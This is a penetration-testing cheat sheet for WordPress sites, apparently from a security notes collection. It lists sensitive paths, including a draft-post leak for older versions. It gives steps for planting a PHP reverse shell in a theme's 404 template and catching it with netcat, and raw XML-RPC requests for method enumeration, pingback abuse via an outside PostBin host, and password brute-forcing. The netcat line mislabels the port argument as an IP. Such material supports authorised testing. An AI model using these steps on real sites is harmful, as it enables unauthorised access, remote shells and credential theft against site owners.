---
title: WordPress Pentesting
desc: Penetration testing on WordPress.
tags: [CMS, Web, WordPress]
alts: [Wpscan]
website:
render_with_liquid: false
---

## Common Directories

```html
/author/admin/
/index.php/author/admin/
/license.txt
/readme.html
/wp-admin/
/wp-admin/upload.php

<!-- Private/Draft Posts (WordPress <= 5.2.3)  -->
/?static=1
```

<br />

## Reverse Shell Injection (login required)

```
1. Access to dashboard (/wp-admin/).
2. Move to "Appearance" and select theme named "Twenty Seventeen".
3. Click "Theme Editor" or "Editor" in the "Appearance" section.
4. In the theme editor, click "404 Template (404.php)" on the right.
5. Copy and paste the code for Reverse Shell (https://github.com/pentestmonkey/php-reverse-shell).
6. Edit "IP" and "Port" in the code.
7. In your terminal, run 'nc -lvnp <IP>'.
8. Browse https://vulnerable.com/wp-content/themes/twentyseventeen/404.php
```

<br />

## XML-RPC (xmlrpc.php)

### 1. Get all methods

```xml
POST /xmlrpc.php HTTP/1.1
Host: vulnerable.com
...

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

### 2. Ping back

Use [PostBin](https://www.toptal.com/developers/postbin/).

```xml
POST /xmlrpc.php HTTP/1.1
Host: vulnerable.com
...

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>https://www.toptal.com/developers/postbin/xxxxxxxxxxxxx-xxxxxxxxxxxxx</string></value></param>
<param><value><string>http://vulnerable.com</string></value></param>
</params>
</methodCall>
```

### 3. Brute force users

It is recommended to use Burp Intruder.

```xml
POST /xmlrpc.php HTTP/1.1
Host: vulnerable.com
...

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>username</value></param> 
<param><value>$password$</value></param> 
</params> 
</methodCall>
```